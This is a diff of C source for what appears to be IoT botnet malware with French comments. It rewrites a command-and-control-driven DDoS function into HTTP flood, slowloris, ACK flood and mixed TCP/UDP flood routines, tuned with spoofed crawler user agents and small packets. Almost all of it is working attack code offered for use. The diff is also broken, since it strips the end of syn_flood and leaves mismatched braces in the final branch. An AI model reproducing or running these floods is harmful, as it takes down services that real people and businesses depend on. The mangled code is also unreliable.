@@ -117,11 +117,6 @@ void syn_flood(char* target, int port, int duration) {
     while (time(NULL) - start_time < duration) {
         // Envoyer des paquets SYN
         sendto(sock, NULL, 0, 0, (struct sockaddr*)&addr, sizeof(addr));
-        usleep(1000);
-    }
-    close(sock);
-}
-
 // Fonction pour effectuer une attaque UDP flood
 void udp_flood(char* target, int port, int duration) {
     int sock;
@@ -182,20 +177,129 @@ void tcp_flood(char* target, int port, int duration) {
     }
 }
 
-// Fonction principale pour effectuer une attaque DDoS
+// Fonction pour effectuer une attaque DDoS
 void ddos_attack(int c2_socket, char* target, int port, int duration, char* method) {
-    // Informer le serveur C2 du début de l'attaque
-    char message[BUFFER_SIZE];
-    sprintf(message, "DDOS_STARTED|%s:%d|%s|%d seconds", target, port, method, duration);
-    send(c2_socket, message, strlen(message), 0);
+    struct sockaddr_in target_addr;
+    target_addr.sin_family = AF_INET;
+    target_addr.sin_port = htons(port);
+    target_addr.sin_addr.s_addr = inet_addr(target);
+    time_t start_time = time(NULL);
+    int sock;
+
+    // Petits paquets pour IoT (128-256 octets)
+    char small_packet[256];
+    for (int i = 0; i < 256; i++) {
+        small_packet[i] = rand() % 256;
+    }
     
-    // Lancer l'attaque dans un processus fils
-    if (fork() == 0) {
-        if (strcmp(method, "http") == 0) {
-            http_flood(target, port, duration);
-        } else if (strcmp(method, "syn") == 0) {
-            syn_flood(target, port, duration);
-        } else if (strcmp(method, "udp") == 0) {
+    if (strcmp(method, "http") == 0) {
+        // Attaque HTTP optimisée pour IoT
+        char *paths[] = {"/", "/index.php", "/home", "/api", "/login"};
+        char *user_agents[] = {
+            "Mozilla/5.0",
+            "Googlebot/2.1",
+            "bingbot/2.0",
+            "Apache-HttpClient/4.5.2",
+            "curl/7.64.1"
+        };
+        
+        while (time(NULL) - start_time < duration) {
+            sock = socket(AF_INET, SOCK_STREAM | SOCK_NONBLOCK, 0);
+            if (sock != -1) {
+                if (connect(sock, (struct sockaddr*)&target_addr, sizeof(target_addr)) != -1) {
+                    char request[256];
+                    snprintf(request, sizeof(request),
+                        "GET %s?%d HTTP/1.1\r\n"
+                        "Host: %s\r\n"
+                        "User-Agent: %s\r\n"
+                        "Connection: close\r\n\r\n",
+                        paths[rand() % 5],
+                        rand(),
+                        target,
+                        user_agents[rand() % 5]);
+                    send(sock, request, strlen(request), 0);
+                }
+                close(sock);
+            }
+            usleep(10000); // 10ms délai
+        }
+    }
+    else if (strcmp(method, "slowloris") == 0) {
+        // Slowloris - garde les connexions ouvertes longtemps
+        int max_sockets = 128;
+        int *sockets = (int*)malloc(max_sockets * sizeof(int));
+        int active_sockets = 0;
+        
+        while (time(NULL) - start_time < duration) {
+            // Maintenir ~128 connexions
+            while (active_sockets < max_sockets) {
+                sock = socket(AF_INET, SOCK_STREAM | SOCK_NONBLOCK, 0);
+                if (sock != -1) {
+                    if (connect(sock, (struct sockaddr*)&target_addr, sizeof(target_addr)) != -1) {
+                        char partial_header[64];
+                        snprintf(partial_header, sizeof(partial_header),
+                            "GET / HTTP/1.1\r\n"
+                            "Host: %s\r\n", target);
+                        send(sock, partial_header, strlen(partial_header), 0);
+                        sockets[active_sockets++] = sock;
+                    } else {
+                        close(sock);
+                    }
+                }
+            }
+            
+            // Envoyer des en-têtes partiels pour maintenir les connexions
+            for (int i = 0; i < active_sockets; i++) {
+                send(sockets[i], "X-a: b\r\n", 8, 0);
+            }
+            
+            sleep(10); // Attendre 10s avant la prochaine vague
+            
+            // Nettoyer les sockets morts
+            for (int i = 0; i < active_sockets; i++) {
+                if (send(sockets[i], "", 0, 0) < 0) {
+                    close(sockets[i]);
+                    sockets[i] = sockets[--active_sockets];
+                    i--;
+                }
+            }
+        }
+        
+        // Nettoyer
+        for (int i = 0; i < active_sockets; i++) {
+            close(sockets[i]);
+        }
+        free(sockets);
+    }
+    else if (strcmp(method, "ack") == 0) {
+        // ACK flood - très léger pour IoT
+        while (time(NULL) - start_time < duration) {
+            sock = socket(AF_INET, SOCK_STREAM | SOCK_NONBLOCK, 0);
+            if (sock != -1) {
+                connect(sock, (struct sockaddr*)&target_addr, sizeof(target_addr));
+                send(sock, small_packet, 64, 0); // Juste 64 octets
+                close(sock);
+            }
+            usleep(5000); // 5ms délai
+        }
+    }
+    else if (strcmp(method, "mix") == 0) {
+        // Mix d'attaques légères
+        while (time(NULL) - start_time < duration) {
+            sock = socket(AF_INET, rand() % 2 ? SOCK_STREAM : SOCK_DGRAM, 0);
+            if (sock != -1) {
+                if (rand() % 2) { // TCP
+                    connect(sock, (struct sockaddr*)&target_addr, sizeof(target_addr));
+                    send(sock, small_packet, 128, 0);
+                } else { // UDP
+                    sendto(sock, small_packet, 128, 0, 
+                           (struct sockaddr*)&target_addr, sizeof(target_addr));
+                }
+                close(sock);
+            }
+            usleep(15000); // 15ms délai
+        }
+    }else if (strcmp(method, "udp") == 0) {
             udp_flood(target, port, duration);
         }
         exit(0);
